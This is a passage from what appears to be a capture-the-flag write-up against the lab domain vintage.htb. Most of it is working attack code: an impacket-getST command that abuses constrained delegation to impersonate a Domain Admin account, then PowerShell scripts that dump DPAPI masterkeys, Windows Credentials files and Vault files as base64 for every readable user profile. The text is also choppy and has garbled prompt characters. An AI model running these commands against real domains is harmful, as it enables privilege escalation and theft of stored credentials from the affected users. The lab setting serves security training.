We cannot impersonate the Administrator account, as it is restricted from network logins. The
L.BIANCHI_ADM user account is a member of Domain Admins. We can impersonate that user to
perform the Delegation attack, get the ticket with an ALT SPN of HTTP , and get a WinRM session.
                                                                                                                     
в”Њв”Ђв”Ђ(rootг‰їkali)-[/home/kali]
в””в”Ђ# impacket-getST -spn 'cifs/dc01.vintage.htb' -altservice 'HTTP/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 'dc01.vintage.htb' 'vintage.htb/fs01$:fs01'

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> 











$SID = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
Write-Output "SID: $SID"
# masterkeys
$mkdir = "$env:APPDATA\Microsoft\Protect\$SID"
if (Test-Path $mkdir) { Get-ChildItem $mkdir -File | ForEach-Object { Write-Output "FILE:$($_.FullName)"; [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)) } } else { Write-Output "Protect dir not found: $mkdir" }
# Credentials directory (generic credentials)
$credDir = "$env:APPDATA\Microsoft\Credentials"
if (Test-Path $credDir) { Get-ChildItem $credDir -File | ForEach-Object { Write-Output "FILE:$($_.FullName)"; [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)) } } else { Write-Output "Credentials dir not found: $credDir" }
# Local Vault (if present)
$vault = "$env:LOCALAPPDATA\Microsoft\Vault"
if (Test-Path $vault) { Get-ChildItem $vault -Recurse -File | ForEach-Object { Write-Output "FILE:$($_.FullName)"; [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)) } } else { Write-Output "Vault dir not found: $vault" }





# show current user & accessible profiles
whoami /user
Get-ChildItem C:\Users -Directory | Select-Object Name,PSPath

# for each profile we can read, dump Protect (masterkeys), Credentials, and Vault files
Get-ChildItem C:\Users -Directory | ForEach-Object {
  $u = $_.Name
  Write-Output "=== PROFILE: $u ==="
  $sidPath = "C:\Users\$u\AppData\Roaming\Microsoft\Protect\*"
  if (Test-Path "C:\Users\$u\AppData\Roaming\Microsoft\Protect") {
    Get-ChildItem -Path $sidPath -File -ErrorAction SilentlyContinue | ForEach-Object {
      Write-Output "FILE:$($_.FullName)"
      [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
    }
  } else { Write-Output "Protect not present for $u" }

  $credPath = "C:\Users\$u\AppData\Roaming\Microsoft\Credentials\*"
  if (Test-Path "C:\Users\$u\AppData\Roaming\Microsoft\Credentials") {
    Get-ChildItem -Path $credPath -File -ErrorAction SilentlyContinue | ForEach-Object {
      Write-Output "FILE:$($_.FullName)"
      [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
    }
  } else { Write-Output "Credentials not present for $u" }

  $vaultPath = "C:\Users\$u\AppData\Local\Microsoft\Vault\**\*"
  if (Test-Path "C:\Users\$u\AppData\Local\Microsoft\Vault") {
    Get-ChildItem -Path $vaultPath -File -ErrorAction SilentlyContinue | ForEach-Object {
      Write-Output "FILE:$($_.FullName)"
      [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))
    }
  } else { Write-Output "Vault not present for $u" }
}
